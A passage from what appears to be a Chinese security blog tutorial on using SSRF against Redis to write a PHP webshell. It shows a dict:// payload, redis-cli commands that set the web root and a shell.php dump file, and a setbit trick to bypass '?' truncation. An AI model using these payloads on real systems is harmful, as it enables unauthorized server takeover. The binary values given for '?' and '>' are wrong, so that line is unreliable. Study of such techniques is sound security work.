+dict://0:6379/bitop:not:shell:shell
+</code></pre>
+<pre><code>127.0.0.1:6379&gt; get shell
+&quot;&lt;?php @eval($_POST[1]);?&gt;&quot;
+</code></pre>
+<p>而在<a href="https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&amp;mid=2247483865&amp;idx=1&amp;sn=41e56040229e383a82a671fc359ee82b&amp;chksm=f9ee6d66ce99e470d102becfcf63955f2aae1d88bc43ef8e7939bc93d786ff2f994eac969d32&amp;scene=126&amp;sessionid=1586255695&amp;key=c00e1a5b49adb240be940797e7d3cb821bae9b89771be268faa858b2888bbba3e96562ccac53df81389cb41e548a9e6412d4f83b6b7b541825630aa6ace9d1d040a3b7cd677b5ca137cc9b1d2297948e&amp;ascene=1&amp;uin=MzE0MDM4MzExMw%3D%3D&amp;devicetype=Windows+10&amp;version=62080079&amp;lang=zh_CN&amp;exportkey=A6a52QI1M4H5IGXp8ekqTtY%3D&amp;pass_ticket=awXcPg%2FApqlfbrG8njT11ZZYAGjwbhrnExtbvARh%2F%2FrtbsupQLnZBKBPE6SCXvhn">一次“SSRF--&gt;RCE”的艰难利用</a>中末尾有提到可以用<code>bitfield</code>，这个的话和<code>bitop</code>,<code>bitos</code>是一个系列的command，https://blog.csdn.net/qq_34206560/article/details/90722401，bitfield命令可以将一个redis字符串看做是一个由二进制位组成的数组，并对这个数组中储存的长度<br>
+不同的整数进行访问(被储存的整数无需对齐)。和bitop相比使用复杂很多，这里不再复现。</p>
+<h3 id="setbit命令绕过截断">setbit命令绕过?截断</h3>
+<p>既然想明白关键是?截断的话其实方法也很多，能操作key就可以。这里举出一个command setbit.</p>
+<p>https://www.runoob.com/redis/strings-setbit.html</p>
+<p>Redis Setbit 命令用于对 key 所储存的字符串值，设置或清除指定偏移量上的位(bit)。</p>
+<p><code>?</code>的ascii是63，ascii62是<code>&gt;</code>，二进制分别是<code>0b00011111</code>和<code>0b00011110</code>。所以按照前面的payload稍微改一下就是.使用setbit改动一位二进制即可把字符变成<code>?</code>，从而可写入webshell。</p>
+<pre><code>127.0.0.1:6379&gt; config set dir /var/www/html
+OK
+127.0.0.1:6379&gt; config set dbfilename shell.php
+OK
+127.0.0.1:6379&gt; set webshell &quot;&lt;&gt;php @eval($_POST[1]);&gt;&gt;&quot;
+OK
+127.0.0.1:6379&gt; setbit webshell 191 1
+(integer) 0
+127.0.0.1:6379&gt; setbit webshell 15 1
+(integer) 0
+127.0.0.1:6379&gt; save
+OK
+</code></pre>
+<h1 id="后纪">后纪</h1>
+<p>其实文章中几个比较新的点都没太多技术含量，但是却鲜有人提到或者提出，这也是我比较奇怪的一个点。志趣相投者，希望能共同探讨技术！</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%9F%BA%E7%A1%80">基础</a>
+<ul>
+<li><a href="#redis%E8%BF%9E%E6%8E%A5%E5%91%BD%E4%BB%A4">redis连接命令</a></li>
+<li><a href="#%E8%AE%BE%E7%BD%AE%E9%94%AE%E5%80%BC%E5%AF%B9">设置键值对:</a></li>
+<li><a href="#%E5%8F%96%E5%87%BA%E9%94%AE%E5%80%BC%E5%AF%B9">取出键值对:</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96%E9%85%8D%E7%BD%AE">获取配置</a></li>
+<li><a href="#%E7%BC%96%E8%BE%91%E9%85%8D%E7%BD%AE">编辑配置</a></li>
+<li><a href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">数据类型</a></li>
+<li><a href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE">服务器配置</a></li>
+<li><a href="#%E8%AE%A4%E8%AF%81">认证</a></li>
+<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD">数据库备份</a></li>
+<li><a href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6">主从复制</a></li>
+<li><a href="#%E5%8A%A0%E8%BD%BD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93">加载动态链接库</a>
+<ul>
+<li><a href="#rce">rce</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#dict%E5%8D%8F%E8%AE%AE%E5%92%8Cgopher%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BBredis">dict协议和gopher协议攻击redis</a>
+<ul>
+<li><a href="#gopher">gopher</a></li>
+<li><a href="#dict">dict</a></li>
+<li><a href="#http%E5%8D%8F%E8%AE%AE%E6%89%93redisprotocol-smuggle%E7%9A%84%E6%80%9D%E8%80%83">http协议打redis（protocol smuggle的思考）</a></li>
+</ul>
+</li>
+<li><a href="#%E5%86%99webshell">写webshell</a>
+<ul>
+<li><a href="#redis-cli%E5%86%99webshell">redis-cli写webshell</a></li>
+<li><a href="#ssrf%E5%86%99webshell">ssrf写webshell</a>
+<ul>
+<li><a href="#%E7%9B%B4%E6%8E%A5%E5%86%99%E5%85%A5%E5%A4%B1%E8%B4%A5">直接写入(失败)</a></li>
+<li><a href="#%E8%BD%AC%E4%B9%89%E7%BB%95%E8%BF%87%E6%88%AA%E6%96%AD">转义绕过?截断</a></li>
+<li><a href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%BB%95%E8%BF%87%E6%88%AA%E6%96%AD">主从复制绕过?截断</a></li>
+<li><a href="#bitop%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E6%88%AA%E6%96%AD">bitop命令绕过?截断</a></li>
+<li><a href="#setbit%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E6%88%AA%E6%96%AD">setbit命令绕过?截断</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E5%90%8E%E7%BA%AA">后纪</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://blog.xray.cool/post/from-information-leak-to-rce/">
+              <h3 class="post-title">
+                记一次从信息泄漏到RCE
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://blog.xray.cool/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
